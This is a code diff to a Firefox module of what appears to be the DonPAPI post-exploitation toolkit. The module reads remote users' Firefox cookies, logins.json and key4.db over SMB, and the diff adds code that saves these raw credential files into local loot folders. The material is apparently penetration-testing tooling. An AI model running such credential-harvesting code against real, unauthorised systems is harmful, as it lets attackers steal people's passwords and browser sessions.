@@ -1,6 +1,7 @@
 import hmac
 import json
 import ntpath
+import os
 import sqlite3
 import tempfile
 from os import remove
@@ -15,6 +16,7 @@ from dploot.lib.smb import DPLootSMBConnection
 from dploot.lib.target import Target
 from donpapi.core import DonPAPICore
 from donpapi.lib.logger import DonPAPIAdapter
+from donpapi.lib.utils import dump_file_to_loot_directories
 
 
 CKA_ID = unhexlify("f8000000000000000000000000000001")
@@ -94,11 +96,13 @@ class Firefox:
                     cookies_data = self.conn.readFile(self.context.share, cookies_path)
                     if cookies_data is not None:
                         firefox_cookies += self.parse_cookie_data(user, cookies_data)
+                        dump_file_to_loot_directories(os.path.join(self.context.target_output_dir, *(cookies_path.split('\\'))), cookies_data)
 
                     logins_path = self.firefox_generic_path.format(user) + "\\" + d.get_longname() + "\\logins.json"
                     logins_data = self.conn.readFile(self.context.share, logins_path)
                     if logins_data is None:
                         continue  # No logins.json file found
+                    dump_file_to_loot_directories(os.path.join(self.context.target_output_dir, *(logins_path.split('\\'))), logins_data)
                     logins = self.get_login_data(logins_data=logins_data)
                     if len(logins) == 0:
                         continue  # No logins profile found
@@ -106,6 +110,7 @@ class Firefox:
                     key4_data = self.conn.readFile(self.context.share, key4_path, bypass_shared_violation=True)
                     if key4_data is None:
                         continue
+                    dump_file_to_loot_directories(os.path.join(self.context.target_output_dir, *(key4_path.split('\\'))), key4_data)
                     key = self.get_key(key4_data=key4_data)
                     if key is None and self.target.password != "":
                         key = self.get_key(
